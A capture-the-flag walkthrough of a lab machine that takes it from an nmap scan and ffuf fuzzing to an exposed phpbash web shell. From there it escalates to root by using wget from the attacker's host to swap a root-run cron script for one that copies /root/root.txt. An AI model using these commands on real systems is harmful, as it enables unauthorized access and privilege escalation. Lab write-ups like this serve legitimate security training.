
 - I start with the famous `nmap` scan
```shell
nmap -sC -sV 10.10.10.68
```
![[Pasted image 20250823141331.png]]

- From the scan I found that the port `80` is open, so it means there is a web application running on that port
- Opening the web app, I am met with a page on which is an article about `phpbash` which is a `bash` terminal that allows us to run commands on a reverse shell directly on the web application![[Pasted image 20250823141444.png]]

- Going through the web app I found in total 4 pages: `scroll`, `about`, `contact` and `home`, but they are not very helpful

- Next thing that came into my mind was to start fuzzing for directories or files which could potentially be exploited
- So with the help of `ffuf` I run the next command
```shell
ffuf -u http://10.10.10.68/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic 
```
- After the scan finished, I was delighted to see that besides the usual directories with, JS code or CSS code, there are some extra one, like: `/php` or `/dev`
![[Pasted image 20250823142542.png]]

- Accessing the `10.10.10.68/dev/` page, I discover a file named `phpbash.php` exactly as the one mentioned on the page![[Pasted image 20250823142422.png]]

- Clicking it, I get, exactly as stated in the article, a reverse shell as the user `www-data`![[Pasted image 20250823142530.png]]

- First I went to the home directory to see what users are present there and I got 2 users:
	- `arrexel`
	- `scriptmanager`
![[Pasted image 20250823142803.png]]

- In the `arrexel` user directory I found the file `flag.txt` which has the permission to be read by others![[Pasted image 20250823142931.png]]

## Root Flag

- Using the command `sudo -l` I found that I can `sudo` as the user `scriptmanager`
![[Pasted image 20250823143044.png]]
- After finding this information, I use `find` to see what the user `scriptmanager` can access
```shell
find / -user scriptmanager | grep -v "Permission Denied"
```
![[Pasted image 20250823143330.png]]
- Very interesting is the directory `/scripts` which contains the file `test.py`

- We cannot `cd` inside the directory but we can list its contents with:
```shell
sudo -u scriptmanager ls -la ./scripts
```
![[Pasted image 20250823144013.png]]
- The `/scripts` directory contains 2 files:
	- `test.py` - owned by `scriptmanager`
	- `test.txt` - owned by `root` 

- Printing out their contents I deduce that the `test.txt` file is modified according to the `test.py` script![[Pasted image 20250823144515.png]]
- I also observed that the `test.txt` file is modified on a regular basis, so I concluded that the `root` user runs the `test.py` 

- On my machine, I wrote a script which will print the content of `/root/root.txt` file, where the flag resides
```python
f = open("test.txt","w")
f1 = open("/root/root.txt","r")
flag = f1.readline()
f.write(flag)
f.close()
f1.close()
```
- Then I transfer the file on the target by opening a http python server with `python3 -m http.server 80`
```shell
sudo -u scriptmanager wget http://<my_machine_IP>:80/test.py -O /scripts/test.py
```

- The original `test.py` script was replaced by my script and printing the contents of `test.txt` file, it gave me the system flag
![[Pasted image 20250823145623.png]]

